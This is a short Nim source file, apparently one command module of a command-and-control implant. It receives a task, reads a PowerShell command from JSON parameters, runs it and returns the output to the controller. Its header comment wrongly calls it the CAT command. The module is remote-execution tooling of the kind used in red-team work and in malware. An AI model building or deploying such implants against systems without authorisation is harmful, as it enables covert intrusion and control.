# This is the source for the CAT command
import os
import json
import ../structs
import ../utils
import ../rth/rth
import ../rth/local-execution/execute_powershell

#[
Execute a Powershell command
  {"command": ".\ps-command-to-execute"}

]#
proc cmd_powershell*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let pscommand = params["command"].getStr()

  # Configure Output
  var
    output = ""
    status = ""

  # Do the Magic
  var payload = Payload(arguments: parseCmdLine(pscommand))
  if not payload.execute():
    status = "error"

  # return the output
  output = payload.output

  # return the response
  return buildReturnData(task.id, output, status)

